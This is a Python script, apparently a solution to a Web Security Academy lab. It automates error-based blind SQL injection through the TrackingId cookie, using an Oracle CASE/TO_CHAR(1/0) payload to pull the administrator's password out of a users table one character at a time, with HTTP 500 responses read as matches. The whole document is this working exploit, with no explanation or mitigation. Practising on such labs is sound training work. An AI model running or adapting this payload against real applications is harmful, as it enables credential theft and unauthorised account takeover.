import requests
import time

URL = 'https://ac8e1f981ec53b54c08222000073004b.web-security-academy.net/'
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


def find_password(tracking_code, session):
    password = ""
    index = 0
    while True:
        time.sleep(0.5)
        found = False
        index = index + 1
        for character in characters:
            sql_query = f"'||(SELECT CASE WHEN SUBSTR(password,{index},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            response = requests.get(URL, cookies={'TrackingId': f"{tracking_code}{sql_query}", 'session': session})
            if response.status_code == 500:
                found = True
                password = password + character
                continue
        if not found:
            print(password)
            break


if __name__ == '__main__':
    r = requests.get(URL)
    tracking_code = r.cookies['TrackingId']
    session = r.cookies['session']
    find_password(tracking_code, session)